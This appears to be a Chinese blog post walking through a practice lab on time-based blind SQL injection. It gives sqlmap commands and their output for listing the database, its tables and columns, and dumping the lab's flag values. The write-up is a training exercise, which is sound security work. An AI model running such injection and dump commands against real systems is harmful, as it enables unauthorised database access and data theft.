---
date: "2020-12-09T00:00:00Z"
description: 掌控安全 SQL 注入靶场练习 - 时间盲注
keywords: SQL注入, SQLMAP
tags:
- 安全
- SQL注入
title: 掌控安全 SQL 注入靶场练习 - 时间盲注
---

# 掌控安全 SQL 注入靶场练习 - 时间盲注

SQL 时间盲注

## 0x01 使用 SQLMAP 工具

### 0x01.1 dump database

```bash
./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 --current-db
```

**执行结果**

```
current database: 'kanwolongxia'
```

### 0x01.2 dump tables

```bash
./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia --tables

```

**执行结果**

```
Database: kanwolongxia
[3 tables]
+--------+
| user   |
| loflag |
| news   |
+--------+
```

> 3 tables: user, loflag, news

### 0x01.3 dump columns

```bash
./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag --columns
```

**执行结果**

```
Database: kanwolongxia
Table: loflag
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flaglo | varchar(255) |
| Id     | int(11)      |
+--------+--------------+
```

### 0x01.4 dump values

```bash
./sqlmap.py -u http://vulhub.example.com:81/Pass-10/index.php?id=1 -D kanwolongxia -T loflag -C flaglo --dump

```

**执行结果**

```
Database: kanwolongxia
Table: loflag
[5 entries]
+----------------+
| flaglo         |
+----------------+
| zKaQ-Moren     |
| zKaQ-QQQ       |
| zKaQ-RD        |
| zKaQ-time-hj   |
| zKaQ-time-zxxz |
+----------------+
```
